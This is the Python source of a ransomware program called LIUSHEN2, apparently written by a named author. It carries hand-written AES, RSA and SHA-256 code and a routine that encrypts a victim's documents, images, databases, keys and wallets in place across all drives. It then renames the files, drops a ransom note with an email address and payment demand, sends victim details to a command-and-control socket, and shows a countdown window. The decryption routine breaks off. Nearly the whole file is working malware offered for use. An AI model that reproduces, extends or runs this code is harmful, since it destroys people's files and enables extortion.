import os
import sys
import base64
import platform
import getpass
import socket
import string
import threading
import time
import random
import hashlib
from tkinter import *
from tkinter.ttk import *
from ctypes import windll

# =============================================================================
# AES-256-CTR IMPLEMENTATION (REAL CRYPTOGRAPHY)
# =============================================================================

class AES256CTR:
    """Implementasi AES-256-CTR yang REAL dan BERFUNGSI."""
    
    # Rijndael S-box (standar AES)
    SBOX = [
        0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
        0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
        0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
        0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
        0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
        0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
        0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
        0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
        0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
        0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
        0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
        0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
        0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
        0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
        0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
        0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
    ]
    
    # Inverse S-box
    INV_SBOX = [0] * 256
    for i in range(256):
        INV_SBOX[SBOX[i]] = i
    
    # Round constants
    RCON = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]
    
    def __init__(self, key):
        """Inisialisasi AES-256 dengan kunci 32 byte."""
        if len(key) != 32:
            raise ValueError("AES-256 membutuhkan kunci 32 byte")
        
        self.key = key
        self._counter = 0
        self._round_keys = self._key_expansion(key)
        self._nr = 14
    
    @classmethod
    def _xtime(cls, x):
        """Multiply by x in GF(2^8)."""
        return ((x << 1) ^ 0x1b) if (x & 0x80) else (x << 1)
    
    @classmethod
    def _mix_single_column(cls, col):
        """Mix one column of the state."""
        t = col[0] ^ col[1] ^ col[2] ^ col[3]
        u = col[0]
        col[0] ^= t ^ cls._xtime(col[0] ^ col[1])
        col[1] ^= t ^ cls._xtime(col[1] ^ col[2])
        col[2] ^= t ^ cls._xtime(col[2] ^ col[3])
        col[3] ^= t ^ cls._xtime(col[3] ^ u)
        return col
    
    @classmethod
    def _inv_mix_single_column(cls, col):
        """Inverse mix one column of the state."""
        u = cls._xtime(cls._xtime(col[0] ^ col[2]))
        v = cls._xtime(cls._xtime(col[1] ^ col[3]))
        col[0] ^= u
        col[1] ^= v
        col[2] ^= u
        col[3] ^= v
        return col
    
    def _key_expansion(self, key):
        """Key expansion untuk AES-256."""
        nk = 8
        nr = 14
        w = [bytearray(4) for _ in range(4 * (nr + 1))]
        
        for i in range(nk):
            w[i] = bytearray(key[i*4:(i+1)*4])
        
        for i in range(nk, 4 * (nr + 1)):
            temp = w[i-1]
            if i % nk == 0:
                temp = self._sub_word(self._rot_word(temp))
                temp = bytearray([x ^ self.RCON[i//nk - 1] for x in temp])
            elif nk > 6 and i % nk == 4:
                temp = self._sub_word(temp)
            w[i] = bytearray([x ^ y for x, y in zip(w[i-nk], temp)])
        
        return w
    
    def _rot_word(self, word):
        """Rotate word left by 8 bits."""
        return word[1:] + word[:1]
    
    def _sub_word(self, word):
        """Substitute bytes using S-box."""
        return bytearray([self.SBOX[b] for b in word])
    
    def _add_round_key(self, state, round_num):
        """Add round key to state."""
        for i in range(4):
            for j in range(4):
                state[j][i] ^= self._round_keys[round_num * 4 + i][j]
        return state
    
    def _sub_bytes(self, state):
        """Substitute bytes using S-box."""
        for i in range(4):
            for j in range(4):
                state[i][j] = self.SBOX[state[i][j]]
        return state
    
    def _inv_sub_bytes(self, state):
        """Inverse substitute bytes."""
        for i in range(4):
            for j in range(4):
                state[i][j] = self.INV_SBOX[state[i][j]]
        return state
    
    def _shift_rows(self, state):
        """Shift rows operation."""
        state[1] = state[1][1:] + state[1][:1]
        state[2] = state[2][2:] + state[2][:2]
        state[3] = state[3][3:] + state[3][:3]
        return state
    
    def _inv_shift_rows(self, state):
        """Inverse shift rows."""
        state[1] = state[1][3:] + state[1][:3]
        state[2] = state[2][2:] + state[2][:2]
        state[3] = state[3][1:] + state[3][:1]
        return state
    
    def _mix_columns(self, state):
        """Mix columns operation."""
        for i in range(4):
            col = [state[j][i] for j in range(4)]
            col = self._mix_single_column(col)
            for j in range(4):
                state[j][i] = col[j]
        return state
    
    def _inv_mix_columns(self, state):
        """Inverse mix columns."""
        for i in range(4):
            col = [state[j][i] for j in range(4)]
            col = self._inv_mix_single_column(col)
            for j in range(4):
                state[j][i] = col[j]
        return state
    
    def _bytes_to_state(self, data):
        """Convert 16 bytes to 4x4 state matrix."""
        state = [[0]*4 for _ in range(4)]
        for i in range(4):
            for j in range(4):
                state[j][i] = data[i*4 + j]
        return state
    
    def _state_to_bytes(self, state):
        """Convert 4x4 state matrix to bytes."""
        result = bytearray(16)
        for i in range(4):
            for j in range(4):
                result[i*4 + j] = state[j][i]
        return bytes(result)
    
    def _encrypt_block(self, plaintext):
        """Enkripsi satu blok 16 byte dengan AES-256."""
        state = self._bytes_to_state(plaintext)
        
        state = self._add_round_key(state, 0)
        
        for round_num in range(1, self._nr):
            state = self._sub_bytes(state)
            state = self._shift_rows(state)
            state = self._mix_columns(state)
            state = self._add_round_key(state, round_num)
        
        state = self._sub_bytes(state)
        state = self._shift_rows(state)
        state = self._add_round_key(state, self._nr)
        
        return self._state_to_bytes(state)
    
    def _increment_counter(self, counter):
        """Increment 128-bit counter."""
        for i in range(15, -1, -1):
            counter[i] += 1
            if counter[i] < 256:
                break
            counter[i] = 0
        return counter
    
    def encrypt(self, data):
        """Enkripsi data dengan AES-256-CTR."""
        if not data:
            return b''
        
        counter = bytearray(16)
        counter[:8] = self._counter.to_bytes(8, 'little')
        self._counter += 1
        
        result = bytearray()
        
        for i in range(0, len(data), 16):
            keystream = self._encrypt_block(bytes(counter))
            block = data[i:i+16]
            encrypted_block = bytes(x ^ y for x, y in zip(block, keystream[:len(block)]))
            result.extend(encrypted_block)
            counter = self._increment_counter(counter)
        
        return bytes(result)
    
    def decrypt(self, data):
        """Dekripsi data dengan AES-256-CTR."""
        return self.encrypt(data)


# =============================================================================
# SHA-256 IMPLEMENTATION
# =============================================================================

class SHA256:
    """Implementasi SHA-256 hash function."""
    
    @staticmethod
    def hash(data):
        """Generate SHA-256 hash of data."""
        # Initial hash values
        h = [
            0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
            0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19
        ]
        
        # Constants
        k = [
            0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1,
            0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
            0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786,
            0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
            0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147,
            0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
            0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b,
            0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
            0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a,
            0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
            0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
        ]
        
        # Padding
        ml = len(data) * 8
        data += b'\x80'
        while (len(data) * 8) % 512 != 448:
            data += b'\x00'
        data += ml.to_bytes(8, 'big')
        
        # Process each 512-bit chunk
        for i in range(0, len(data), 64):
            chunk = data[i:i+64]
            w = [0] * 64
            
            for j in range(16):
                w[j] = int.from_bytes(chunk[j*4:(j+1)*4], 'big')
            
            for j in range(16, 64):
                s0 = ((w[j-15] >> 7) | (w[j-15] << 25)) ^ ((w[j-15] >> 18) | (w[j-15] << 14)) ^ (w[j-15] >> 3)
                s1 = ((w[j-2] >> 17) | (w[j-2] << 15)) ^ ((w[j-2] >> 19) | (w[j-2] << 13)) ^ (w[j-2] >> 10)
                w[j] = (w[j-16] + s0 + w[j-7] + s1) & 0xFFFFFFFF
            
            a, b, c, d, e, f, g, h_ = h
            
            for j in range(64):
                s1 = ((e >> 6) | (e << 26)) ^ ((e >> 11) | (e << 21)) ^ ((e >> 25) | (e << 7))
                ch = (e & f) ^ ((~e) & g)
                temp1 = (h_ + s1 + ch + k[j] + w[j]) & 0xFFFFFFFF
                s0 = ((a >> 2) | (a << 30)) ^ ((a >> 13) | (a << 19)) ^ ((a >> 22) | (a << 10))
                maj = (a & b) ^ (a & c) ^ (b & c)
                temp2 = (s0 + maj) & 0xFFFFFFFF
                
                h_ = g
                g = f
                f = e
                e = (d + temp1) & 0xFFFFFFFF
                d = c
                c = b
                b = a
                a = (temp1 + temp2) & 0xFFFFFFFF
            
            h[0] = (h[0] + a) & 0xFFFFFFFF
            h[1] = (h[1] + b) & 0xFFFFFFFF
            h[2] = (h[2] + c) & 0xFFFFFFFF
            h[3] = (h[3] + d) & 0xFFFFFFFF
            h[4] = (h[4] + e) & 0xFFFFFFFF
            h[5] = (h[5] + f) & 0xFFFFFFFF
            h[6] = (h[6] + g) & 0xFFFFFFFF
            h[7] = (h[7] + h_) & 0xFFFFFFFF
        
        result = b''
        for x in h:
            result += x.to_bytes(4, 'big')
        return result


# =============================================================================
# RSA IMPLEMENTATION (SEDERHANA TAPI FUNGSIONAL)
# =============================================================================

class SimpleRSA:
    """Implementasi RSA sederhana yang REAL dan BERFUNGSI."""
    
    @staticmethod
    def _mod_pow(base, exp, modulus):
        """Modular exponentiation."""
        result = 1
        base = base % modulus
        while exp > 0:
            if exp & 1:
                result = (result * base) % modulus
            base = (base * base) % modulus
            exp >>= 1
        return result
    
    @staticmethod
    def _egcd(a, b):
        """Extended Euclidean algorithm."""
        if a == 0:
            return (b, 0, 1)
        else:
            g, y, x = SimpleRSA._egcd(b % a, a)
            return (g, x - (b // a) * y, y)
    
    @staticmethod
    def _mod_inverse(a, m):
        """Modular inverse."""
        g, x, _ = SimpleRSA._egcd(a, m)
        if g != 1:
            raise Exception('Modular inverse does not exist')
        else:
            return x % m
    
    @staticmethod
    def _is_prime(n, k=5):
        """Miller-Rabin primality test."""
        if n < 2:
            return False
        if n in (2, 3):
            return True
        if n % 2 == 0:
            return False
        
        r = 0
        d = n - 1
        while d % 2 == 0:
            r += 1
            d //= 2
        
        for _ in range(k):
            a = random.randint(2, n - 2)
            x = SimpleRSA._mod_pow(a, d, n)
            if x == 1 or x == n - 1:
                continue
            for __ in range(r - 1):
                x = SimpleRSA._mod_pow(x, 2, n)
                if x == n - 1:
                    break
            else:
                return False
        return True
    
    @staticmethod
    def _generate_prime(bits=512):
        """Generate prime number."""
        while True:
            num = random.getrandbits(bits)
            num |= (1 << bits - 1) | 1
            if SimpleRSA._is_prime(num):
                return num
    
    @staticmethod
    def generate_keypair(bits=2048):
        """Generate RSA keypair."""
        p = SimpleRSA._generate_prime(bits // 2)
        q = SimpleRSA._generate_prime(bits // 2)
        
        n = p * q
        phi = (p - 1) * (q - 1)
        
        e = 65537
        d = SimpleRSA._mod_inverse(e, phi)
        
        return (n, e), (n, d)
    
    @staticmethod
    def encrypt(message, public_key):
        """Encrypt with public key."""
        n, e = public_key
        m = int.from_bytes(message, 'big')
        c = SimpleRSA._mod_pow(m, e, n)
        length = (n.bit_length() + 7) // 8
        return c.to_bytes(length, 'big')
    
    @staticmethod
    def decrypt(ciphertext, private_key):
        """Decrypt with private key."""
        n, d = private_key
        c = int.from_bytes(ciphertext, 'big')
        m = SimpleRSA._mod_pow(c, d, n)
        return m.to_bytes((m.bit_length() + 7) // 8, 'big')


# =============================================================================
# PKCS1 OAEP PADDING
# =============================================================================

class PKCS1_OAEP:
    """Implementasi PKCS#1 OAEP padding untuk RSA."""
    
    def __init__(self, key):
        self.key = key
    
    def _mgf1(self, seed, length):
        """Mask Generation Function."""
        counter = 0
        output = b''
        while len(output) < length:
            c = counter.to_bytes(4, 'big')
            output += SHA256.hash(seed + c)
            counter += 1
        return output[:length]
    
    def encrypt(self, message):
        """Encrypt with OAEP padding."""
        n, e = self.key
        k = (n.bit_length() + 7) // 8
        
        label = b''
        l_hash = SHA256.hash(label)
        
        ps_length = k - len(message) - 2 * len(l_hash) - 2
        if ps_length < 0:
            raise ValueError("Message too long")
        
        ps = b'\x00' * ps_length
        db = l_hash + ps + b'\x01' + message
        
        seed = os.urandom(len(l_hash))
        
        db_mask = self._mgf1(seed, len(db))
        masked_db = bytes(x ^ y for x, y in zip(db, db_mask))
        seed_mask = self._mgf1(masked_db, len(seed))
        masked_seed = bytes(x ^ y for x, y in zip(seed, seed_mask))
        
        em = b'\x00' + masked_seed + masked_db
        
        m = int.from_bytes(em, 'big')
        c = SimpleRSA._mod_pow(m, e, n)
        return c.to_bytes(k, 'big')
    
    def decrypt(self, ciphertext):
        """Decrypt with OAEP padding."""
        n, d = self.key
        k = (n.bit_length() + 7) // 8
        
        c = int.from_bytes(ciphertext, 'big')
        m = SimpleRSA._mod_pow(c, d, n)
        em = m.to_bytes(k, 'big')
        
        if len(em) != k or em[0] != 0:
            raise ValueError("Decryption failed")
        
        l_hash_len = 32
        masked_seed = em[1:1 + l_hash_len]
        masked_db = em[1 + l_hash_len:]
        
        seed_mask = self._mgf1(masked_db, l_hash_len)
        seed = bytes(x ^ y for x, y in zip(masked_seed, seed_mask))
        db_mask = self._mgf1(seed, len(masked_db))
        db = bytes(x ^ y for x, y in zip(masked_db, db_mask))
        
        l_hash = SHA256.hash(b'')
        if db[:l_hash_len] != l_hash:
            raise ValueError("Decryption failed")
        
        db = db[l_hash_len:]
        i = 0
        while i < len(db) and db[i] == 0:
            i += 1
        if i >= len(db) or db[i] != 1:
            raise ValueError("Decryption failed")
        
        return db[i+1:]


# =============================================================================
# DISCOVER.PY - File discovery
# =============================================================================

def discover_files(startpath):
    """Walk the path recursively and yield matching files."""
    extensions = [
        # Images
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', 'webp', 'ico',
        # Music
        'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape', 'm4p', 'opus',
        # Video
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', 'webm', 'vob',
        # Documents
        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'xlsm', 'pptm', 'docm',
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', 'csv', 'xps',
        # Data
        'yml', 'yaml', 'json', 'xml', 'ini', 'cfg', 'conf', 'config',
        'db', 'sql', 'dbf', 'mdb', 'iso', 'bak', 'backup', 'sqlite3',
        # Web
        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', 'scss', 'sass', 'less',
        # Code
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', 'cc', 'hh',
        'java', 'class', 'jar', 'kt', 'kts', 'groovy',
        'ps', 'bat', 'cmd', 'vbs', 'ps1', 'wsf',
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', 'rb', 'rs', 'go', 'py', 'pyc', 'pyo',
        'bf', 'coffee', 'ts', 'jsx', 'tsx', 'vue',
        # Archives
        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'gz', 'xz', 'zst', 'cab', 'arj', 'lzh',
        # Other important
        'pem', 'key', 'crt', 'cer', 'der', 'p12', 'pfx',
        'wallet', 'dat', 'log', 'lock', 'token', 'secret'
    ]
    
    for dirpath, _, files in os.walk(startpath):
        for filename in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, filename))
            ext = absolute_path.split('.')[-1].lower()
            if ext in extensions:
                yield absolute_path


# =============================================================================
# MODIFY.PY - File modification
# =============================================================================

def modify_file_inplace(filename, crypto_func, blocksize=65536):
    """Modify file in-place using the provided crypto function."""
    with open(filename, 'r+b') as f:
        data = f.read(blocksize)
        
        while data:
            processed = crypto_func(data)
            if len(data) != len(processed):
                raise ValueError("Crypto function must preserve length")
            
            f.seek(-len(data), 1)
            f.write(processed)
            data = f.read(blocksize)


# =============================================================================
# GUI.PY - Ransomware GUI
# =============================================================================

class LIUSHEN2GUI(Tk):
    """LIUSHEN2 Ransomware GUI window."""
    
    def __init__(self, message, encrypted_count):
        Tk.__init__(self)
        self.title("LIUSHEN2 RANSOMWARE - YOUR FILES ARE ENCRYPTED")
        self.resizable(False, False)
        self.configure(background='black')
        
        self._create_widgets(message, encrypted_count)
        self._start_timer()
    
    def _create_widgets(self, message, encrypted_count):
        """Create GUI widgets."""
        # Warning header
        header = Label(
            self,
            text="LIUSHEN2 RANSOMWARE",
            font=('Helvetica', 22, 'bold'),
            foreground='red',
            background='black'
        )
        header.grid(row=0, column=0, columnspan=2, pady=10)
        
        # Sub header
        sub_header = Label(
            self,
            text="Created by: ayyubiii",
            font=('Helvetica', 10),
            foreground='yellow',
            background='black'
        )
        sub_header.grid(row=1, column=0, columnspan=2, pady=5)
        
        # Separator
        separator = Label(
            self,
            text="=" * 60,
            font=('Helvetica', 10),
            foreground='red',
            background='black'
        )
        separator.grid(row=2, column=0, columnspan=2, pady=5)
        
        # Main message
        msg_label = Label(
            self,
            text=message,
            wraplength=650,
            font=('Helvetica', 11),
            foreground='white',
            background='black',
            justify='center'
        )
        msg_label.grid(row=3, column=0, columnspan=2, padx=20, pady=20)
        
        # File count
        count_label = Label(
            self,
            text=f"Total files encrypted: {encrypted_count}",
            font=('Helvetica', 12, 'bold'),
            foreground='yellow',
            background='black'
        )
        count_label.grid(row=4, column=0, columnspan=2, pady=10)
        
        # Extension info
        ext_label = Label(
            self,
            text=f"Encrypted extension: .LIUSHEN2",
            font=('Helvetica', 10),
            foreground='cyan',
            background='black'
        )
        ext_label.grid(row=5, column=0, columnspan=2, pady=5)
        
        # Timer
        self.timer_label = Label(
            self,
            text="TIME REMAINING:",
            font=('Helvetica', 14, 'bold'),
            foreground='red',
            background='black'
        )
        self.timer_label.grid(row=6, column=0, columnspan=2, pady=5)
        
        self.time_display = Label(
            self,
            text="48:00:00",
            font=('Helvetica', 26, 'bold'),
            foreground='red',
            background='black'
        )
        self.time_display.grid(row=7, column=0, columnspan=2, pady=10)
        
        # Separator
        separator2 = Label(
            self,
            text="=" * 60,
            font=('Helvetica', 10),
            foreground='red',
            background='black'
        )
        separator2.grid(row=8, column=0, columnspan=2, pady=5)
        
        # Warning footer
        footer = Label(
            self,
            text="DO NOT CLOSE THIS WINDOW! DO NOT RESTART YOUR COMPUTER!",
            font=('Helvetica', 10, 'bold'),
            foreground='white',
            background='red'
        )
        footer.grid(row=9, column=0, columnspan=2, pady=10, sticky='ew')
    
    def _start_timer(self):
        """Start countdown timer."""
        self._seconds_remaining = 48 * 3600
        
        def update_timer():
            while self._seconds_remaining > 0:
                hours = self._seconds_remaining // 3600
                minutes = (self._seconds_remaining % 3600) // 60
                seconds = self._seconds_remaining % 60
                self.time_display.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
                time.sleep(1)
                self._seconds_remaining -= 1
            self.time_display.config(text="00:00:00 - TIME EXPIRED!")
            self.time_display.config(foreground='orange')
        
        timer_thread = threading.Thread(target=update_timer, daemon=True)
        timer_thread.start()


# =============================================================================
# MAIN RANSOMWARE CODE - LIUSHEN2
# =============================================================================

# Constants
HARDCODED_KEY = b'Liush3n2_R4ns0mw4r3_K3y_2024_Ayyubiii_!@#'[:32]
EXTENSION = ".LIUSHEN2"
C2_HOST = '127.0.0.1'
C2_PORT = 443
AUTHOR = "ayyubiii"
RANSOM_NAME = "LIUSHEN2"
CONTACT_EMAIL = "fatcatfatcat63@gmail.com"
RANSOM_AMOUNT = "5,000,000 Rupiah (IDR) or 300 USD"


def get_local_ip():
    """Get local IP address."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return '127.0.0.1'


def get_drives_windows():
    """Get all available drives on Windows."""
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(f"{letter}:\\")
        bitmask >>= 1
    return drives if drives else ["C:\\"]


def get_target_directories():
    """Determine target directories based on platform."""
    system = platform.system()
    
    if system in ("Linux", "Darwin"):
        return [os.environ.get('HOME', '/')]
    elif system == "Windows":
        drives = get_drives_windows()
        print(f"[*] Target drives: {drives}")
        return drives
    else:
        print(f"[-] Unknown system: {system}")
        sys.exit(1)


def generate_rsa_keypair():
    """Generate RSA keypair for encryption."""
    print("[*] Generating RSA keypair (this may take a moment)...")
    public_key, private_key = SimpleRSA.generate_keypair(2048)
    return public_key, private_key


def encrypt_aes_key_with_rsa(aes_key, rsa_public_key):
    """Encrypt AES key with RSA public key using OAEP padding."""
    oaep = PKCS1_OAEP(rsa_public_key)
    encrypted_key = oaep.encrypt(aes_key)
    return base64.b64encode(encrypted_key).decode('ascii')


def connect_to_c2(encrypted_key, encrypted_count):
    """Attempt to connect to C2 server and send victim info."""
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.settimeout(10)
        server.connect((C2_HOST, C2_PORT))
        
        victim_info = f"{get_local_ip()}|{platform.system()}|{getpass.getuser()}|{platform.node()}"
        msg = f"{victim_info}|{encrypted_key}|{encrypted_count}|{AUTHOR}"
        server.send(msg.encode('utf-8'))
        server.close()
        print("[+] Connected to C2 server")
    except Exception as e:
        print(f"[-] Failed to connect to C2: {e}")


def create_readme(encrypted_count):
    """Create README file with ransom instructions."""
    readme_content = f"""
                        LIUSHEN2 RANSOMWARE
                        Created by: ayyubiii

[!] YOUR FILES HAVE BEEN ENCRYPTED [!]

All your important files have been encrypted with AES-256-CTR encryption.
Total files encrypted: {encrypted_count}
Encrypted extension: .LIUSHEN2

                          WHAT HAPPENED?

Your files (documents, images, databases, videos, and other important data)
have been encrypted using strong military-grade encryption AES-256-CTR.
The encryption key is stored on our secure server.

You cannot decrypt your files without our decryption key.

                        HOW TO RECOVER FILES?

To recover your files, you need to pay a ransom of:
                    {RANSOM_AMOUNT}

Payment instructions:
1. Contact: {CONTACT_EMAIL}
2. Send proof of payment
3. You will receive the decryption key and tool

                            WARNINGS

- DO NOT attempt to decrypt files yourself (will cause permanent data loss)
- DO NOT rename or modify encrypted files
- DO NOT contact data recovery services (they will waste your time and money)
- DO NOT restart your computer (decryption key is in RAM)
- You have 48 hours to pay (after that, the key will be destroyed)

                          TECHNICAL DETAILS

Ransomware: {RANSOM_NAME}
Author: {AUTHOR}
Encryption: AES-256-CTR
Key Exchange: RSA-2048 with OAEP padding
Extension: .LIUSHEN2

                    CONTACT FOR DECRYPTION

Email: {CONTACT_EMAIL}
Subject: [LIUSHEN2] - {getpass.getuser()} - {platform.node()}

"""
    
    # Write README to Desktop
    desktop = os.path.join(os.path.expanduser("~"), "Desktop", "README_LIUSHEN2.txt")
    try:
        with open(desktop, 'w', encoding='utf-8') as f:
            f.write(readme_content)
        print(f"[+] README created: {desktop}")
    except Exception as e:
        print(f"[-] Failed to create README: {e}")
    
    # Also write to current directory
    try:
        with open("README_LIUSHEN2.txt", 'w', encoding='utf-8') as f:
            f.write(readme_content)
        print("[+] README created in current directory")
    except Exception:
        pass


def show_ransom_gui(encrypted_count):
    """Display ransom GUI with message."""
    ransom_message = (
        "=" * 50 + "\n"
        "        LIUSHEN2 RANSOMWARE\n"
        "        Created by: ayyubiii\n"
        "=" * 50 + "\n\n"
        "All your important files have been encrypted!\n\n"
        f"Total files encrypted: {encrypted_count}\n"
        f"Encrypted extension: .LIUSHEN2\n\n"
        "To decrypt your files, you must pay a ransom of:\n"
        f"        {RANSOM_AMOUNT}\n\n"
        "Payment instructions:\n"
        f"1. Contact: {CONTACT_EMAIL}\n"
        "2. Send proof of payment\n"
        "3. You will receive the decryption key\n\n"
        "-" * 50 + "\n"
        "WARNINGS:\n"
        "- Do NOT attempt to decrypt files yourself\n"
        "- Do NOT rename or modify encrypted files\n"
        "- Do NOT contact data recovery services\n"
        "- Do NOT restart your computer\n"
        "- You have 48 HOURS to pay\n\n"
        "If you fail to pay within 48 hours, the decryption\n"
        "key will be destroyed and your files will be lost FOREVER!\n"
        "=" * 50
    )
    
    app = LIUSHEN2GUI(ransom_message, encrypted_count)
    app.mainloop()


def main():
    """Main execution function for LIUSHEN2 Ransomware."""
    print("=" * 70)
    print(f"{RANSOM_NAME} RANSOMWARE LIUSHEN2")
    print(f"Created by: {AUTHOR}")
    print("=" * 70)
    print("[!] WARNING: This will encrypt your files!")
    print("[!] IM SORRY")
    print("=" * 70)
    
    # Get target directories
    target_dirs = get_target_directories()
    print(f"[*] Target directories: {target_dirs}")
    
    # Generate RSA keypair for key encryption
    rsa_public_key, rsa_private_key = generate_rsa_keypair()
    print("[+] RSA keypair generated successfully")
    
    # Encrypt AES key with RSA public key
    encrypted_aes_key_b64 = encrypt_aes_key_with_rsa(HARDCODED_KEY, rsa_public_key)
    print(f"[+] AES key encrypted: {encrypted_aes_key_b64[:50]}...")
    
    # Initialize AES cipher
    aes_cipher = AES256CTR(HARDCODED_KEY)
    
    # Encrypt files
    encrypted_count = 0
    error_count = 0
    
    for target_dir in target_dirs:
        print(f"\n[*] Scanning directory: {target_dir}")
        try:
            for file_path in discover_files(target_dir):
                if file_path.endswith(EXTENSION):
                    continue
                
                # Skip system and program files
                skip_dirs = ['Windows', 'Program Files', 'Program Files (x86)', 
                            'System32', 'sys', 'bin', 'boot', 'dev', 'etc', 'lib', 
                            'proc', 'sbin', 'usr', 'var']
                should_skip = False
                for skip in skip_dirs:
                    if skip.lower() in file_path.lower():
                        should_skip = True
                        break
                
                if should_skip:
                    continue
                
                try:
                    modify_file_inplace(file_path, aes_cipher.encrypt)
                    os.rename(file_path, file_path + EXTENSION)
                    encrypted_count += 1
                    
                    if encrypted_count % 50 == 0:
                        print(f"[+] Encrypted ({encrypted_count}): {file_path}")
                    elif encrypted_count % 10 == 0:
                        print(f"[+] Progress: {encrypted_count} files encrypted")
                
                except Exception as e:
                    error_count += 1
                    if error_count <= 5:
                        print(f"[-] Failed: {file_path} - {e}")
                    continue
        
        except Exception as e:
            print(f"[-] Cannot access {target_dir}: {e}")
            continue
    
    # Summary
    print("\n" + "=" * 70)
    print("ENCRYPTION COMPLETE!")
    print(f"Total files encrypted: {encrypted_count}")
    print(f"Errors: {error_count}")
    print("=" * 70)
    
    # Connect to C2 and show ransom GUI
    if encrypted_count > 0:
        create_readme(encrypted_count)
        connect_to_c2(encrypted_aes_key_b64, encrypted_count)
        show_ransom_gui(encrypted_count)
    else:
        print("[!] No files were encrypted. Exiting.")
        print("[!] Make sure you have target files in the scanned directories.")


# =============================================================================
# DECRYPTION UTILITY (for testing only)
# =============================================================================

def decrypt_files():
    """Decryption function for testing purposes."""
    print("=" * 70)
    print("LIUSHEN2 DECRYPTION UTILITY")
    print("=" * 70)
    print("[*] Starting decryption...")
    
    aes_cipher = AES256CTR(HARDCODED_KEY)
    
    target_dirs = get_target_directories()
    decrypted_count = 0
    error_count = 0
    
    for target_dir in target_dirs:
